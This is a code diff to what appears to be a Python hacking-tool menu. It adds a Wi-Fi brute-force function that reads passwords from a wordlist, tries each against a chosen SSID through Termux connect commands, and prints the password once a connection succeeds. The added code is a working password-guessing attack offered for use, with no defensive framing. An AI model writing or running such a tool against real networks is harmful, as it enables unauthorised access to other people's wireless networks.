@@ -1,4 +1,4 @@
-def WifiBF(colors):
+def WifiBF0(colors):
     import os
     import os.path
     import platform
@@ -71,7 +71,7 @@ def WifiBF(colors):
         time.sleep(2.5)
         
         ssid = input(">>> Type Wifi name (SSID): ")
-        filee = ('terminal_commands/MrPaper.txt')
+        filee = ('terminal_commands\MrPaper.txt')
 
 
         if os.path.exists(filee):
@@ -82,3 +82,31 @@ def WifiBF(colors):
             print(f"\n[{colors["%>-<%"]}ERROR{colors['%---%']}] No Such File.")
 
     menu()
+
+def WifiBF():
+    import subprocess
+    import time
+    import json
+    
+    ssid = str(input(">>> Type the wifi name (SSID):"))
+
+    print(f"[+] Cracking '{ssid}'...")
+
+    with open('terminal_commands\MrPaper.txt', 'r') as f:
+        while True:
+            line = f.readline()
+            if not line:
+                break
+            passwd = line.strip()
+
+            result = subprocess.run(['termux-wifi-connect', ssid, passwd], capture_output=True, text=True)
+
+            time.sleep(5)
+
+            status = subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True)
+
+            info = json.loads(status.stdout)
+            if info.get('supplicant_state') == 'COMPLETED' and info.get('ssid'):
+                print("[ OK ] Cracked!")
+                print(f"[+] {ssid} password: {passwd}")
+                break
